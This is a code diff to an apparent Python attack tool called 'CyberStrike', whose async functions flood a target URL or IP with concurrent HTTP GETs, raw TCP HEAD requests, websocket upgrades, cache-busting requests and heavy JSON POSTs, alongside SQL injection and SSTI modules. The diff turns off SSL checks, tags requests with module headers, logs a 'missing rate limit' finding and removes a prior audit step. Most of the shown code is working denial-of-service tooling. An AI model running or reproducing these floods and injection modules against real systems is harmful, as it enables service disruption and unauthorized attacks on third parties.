@@ -152,11 +152,15 @@ manager = ConnectionManager()
 # Attack functions
 async def ddos_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     timeout_cfg = aiohttp.ClientTimeout(total=2.5, sock_connect=1.5, sock_read=2.0)
-    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
+    connector = aiohttp.TCPConnector(ssl=False, limit=100)
+    finding_logged = False
+    ok_count = 0
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
         start_time = time.time()
         tasks = []
         
         async def send_request():
+            nonlocal finding_logged, ok_count
             while time.time() - start_time < duration and metrics["attacks_running"]:
                 try:
                     headers = {
@@ -164,13 +168,28 @@ async def ddos_attack(url: str, duration: int, intensity: int, threads: int, att
                             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
-                        ])
+                        ]),
+                        "X-CyberStrike-Module": "ddos"
                     }
                     
                     req_start = time.time()
                     async with session.get(url, headers=headers) as response:
                         req_time = time.time() - req_start
                         await record_request_metric(True, req_time, response.status)
+                        if response.status < 400:
+                            ok_count += 1
+                            if not finding_logged and ok_count >= 10:
+                                finding_logged = True
+                                await _broadcast_finding({
+                                    "type": "Unthrottled HTTP Flood / Missing Rate Limit (DDoS)",
+                                    "severity": "Medium",
+                                    "url": url,
+                                    "payload": f"Concurrent Multi-Worker HTTP GET Flood ({threads} workers)",
+                                    "detail": "Target processed sustained high-concurrency HTTP flood traffic without enforcing HTTP 429 Too Many Requests or connection throttling.",
+                                    "evidence": f"HTTP {response.status} | {ok_count}+ unthrottled flood requests | RTT: {req_time*1000:.1f} ms",
+                                    "timestamp": datetime.now().isoformat(),
+                                    "attack_id": attack_id
+                                })
                         
                         await manager.broadcast(json.dumps({
                             "type": "metrics",
@@ -228,7 +247,7 @@ async def sql_injection_attack(url: str, duration: int, intensity: int, threads:
         baseline_text = ""
         baseline_len = 0
         try:
-            async with session.get(f"{base}/api/products?id=1") as base_resp:
+            async with session.get(f"{base}/api/products?id=1", headers={"X-CyberStrike-Baseline": "true"}) as base_resp:
                 baseline_text = (await base_resp.text()).lower()
                 baseline_len = len(baseline_text)
         except Exception:
@@ -1345,7 +1364,7 @@ async def ip_stress_attack(ip: str, duration: int, intensity: int, threads: int,
                     target_url = f"{scheme}://{ip_str}:{port}/"
                     req_start = time.time()
                     try:
-                        headers = {"User-Agent": random.choice(ua_list)}
+                        headers = {"User-Agent": random.choice(ua_list), "X-CyberStrike-Module": "ip_stress"}
                         async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=1.5)) as resp:
                             req_time = time.time() - req_start
                             await record_request_metric(True, req_time, resp.status)
@@ -1373,7 +1392,7 @@ async def ip_stress_attack(ip: str, duration: int, intensity: int, threads: int,
             req_start = time.time()
             try:
                 reader, writer = await asyncio.wait_for(asyncio.open_connection(clean_ip, port), timeout=1.0)
-                writer.write(b"HEAD / HTTP/1.1\r\nHost: " + clean_ip.encode() + b"\r\n\r\n")
+                writer.write(b"HEAD / HTTP/1.1\r\nHost: " + clean_ip.encode() + b"\r\nX-CyberStrike-Module: ip_stress\r\n\r\n")
                 await asyncio.wait_for(writer.drain(), timeout=0.8)
                 req_time = time.time() - req_start
                 writer.close()
@@ -1522,7 +1541,7 @@ async def ssti_attack(url: str, duration: int, intensity: int, threads: int, att
     async with aiohttp.ClientSession(connector=connector) as session:
         baseline_text = ""
         try:
-            async with session.get(base, timeout=aiohttp.ClientTimeout(total=4)) as b_resp:
+            async with session.get(base, headers={"X-CyberStrike-Baseline": "true"}, timeout=aiohttp.ClientTimeout(total=4)) as b_resp:
                 baseline_text = await b_resp.text()
         except Exception:
             pass
@@ -1909,7 +1928,7 @@ async def cache_bust_attack(url: str, duration: int, intensity: int, threads: in
     async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
         try:
             t_b = time.time()
-            async with session.get(base) as b_resp:
+            async with session.get(base, headers={"X-CyberStrike-Baseline": "true"}) as b_resp:
                 baseline_rtt = max(time.time() - t_b, 0.002)
         except Exception:
             baseline_rtt = 0.015
@@ -1926,7 +1945,8 @@ async def cache_bust_attack(url: str, duration: int, intensity: int, threads: in
                     "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
                     "Pragma": "no-cache",
                     "Accept-Encoding": "identity",
-                    "User-Agent": f"CyberStrike-CacheBust/{w_id}.{seq}"
+                    "User-Agent": f"CyberStrike-CacheBust/{w_id}.{seq}",
+                    "X-CyberStrike-Module": "cache_bust"
                 }
                 t0 = time.time()
                 try:
@@ -2016,7 +2036,7 @@ async def heavy_post_attack(url: str, duration: int, intensity: int, threads: in
                     async with session.post(
                         ep,
                         json=nested_json,
-                        headers={"Content-Type": "application/json", "X-Stress-Worker": str(w_id)}
+                        headers={"Content-Type": "application/json", "X-Stress-Worker": str(w_id), "X-CyberStrike-Module": "heavy_post"}
                     ) as resp:
                         await resp.read()
                         req_time = time.time() - t0
@@ -2122,7 +2142,8 @@ async def ws_stress_attack(url: str, duration: int, intensity: int, threads: int
                                 "Connection": "Upgrade",
                                 "Upgrade": "websocket",
                                 "Sec-WebSocket-Version": "13",
-                                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="
+                                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+                                "X-CyberStrike-Module": "ws_flood"
                             },
                             timeout=aiohttp.ClientTimeout(total=3.0)
                         ) as resp:
@@ -2191,7 +2212,7 @@ async def api_stress_attack(url: str, duration: int, intensity: int, threads: in
                 seq += 1
                 t0 = time.time()
                 try:
-                    async with session.request(method, ep, json=body_json) as resp:
+                    async with session.request(method, ep, json=body_json, headers={"X-CyberStrike-Module": "api_flood"}) as resp:
                         await resp.read()
                         req_time = time.time() - t0
                         await record_request_metric(resp.status < 500, req_time, resp.status)
@@ -2234,10 +2255,6 @@ async def run_attack_coordinator(req: AttackRequest, attack_id: str):
     metrics["attacks_running"] = True
     metrics["current_attacks"].append(req.attack_type)
     metrics["start_time"] = datetime.now().isoformat()
-
-    # ── Real security audit runs first for HTTP/host modules ─────────
-    if req.attack_type not in ("ip_stress", "phone_probe"):
-        await target_audit(req.url, attack_id)
 
     await manager.broadcast(json.dumps({
         "type": "log",
